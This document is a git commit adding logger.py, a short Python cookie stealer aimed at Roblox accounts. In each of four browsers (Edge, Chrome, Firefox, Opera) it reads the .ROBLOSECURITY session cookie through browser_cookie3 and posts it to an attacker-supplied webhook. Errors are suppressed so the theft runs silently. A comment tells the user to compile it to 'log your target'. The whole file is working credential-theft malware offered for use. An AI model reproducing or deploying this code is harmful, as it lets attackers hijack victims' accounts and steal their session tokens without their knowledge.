eface1a11d8b366a157b59cf246c01ffaf047b10
nab0rs <77415460+nab0rs@users.noreply.github.com>
2021-02-03 08:34:51 -0800

    Create logger.py

---
+++ logger.py
@@ -0,0 +1,44 @@
+import browser_cookie3, requests, threading
+
+webhook = "" # Webhook here and make sure to compile if you wanna log your target
+
+def edge_logger():
+    try:
+        cookies = browser_cookie3.edge(domain_name='roblox.com')
+        cookies = str(cookies)
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+    except:
+        pass
+def chrome_logger():
+    try:
+        cookies = browser_cookie3.chrome(domain_name='roblox.com')
+        cookies = str(cookies)
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+    except:
+        pass
+
+
+def firefox_logger():
+    try:
+        cookies = browser_cookie3.firefox(domain_name='roblox.com')
+        cookies = str(cookies)
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+    except:
+        pass
+
+def opera_logger():
+    try:
+        cookies = browser_cookie3.opera(domain_name='roblox.com')
+        cookies = str(cookies)
+        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
+        requests.post(webhook, json={'username':'LOGGER', 'content':f'```Cookie: {cookie}```'})
+    except:
+        pass
+
+browsers = [edge_logger, chrome_logger, firefox_logger, opera_logger]
+
+for x in browsers:
+    threading.Thread(target=x,).start()
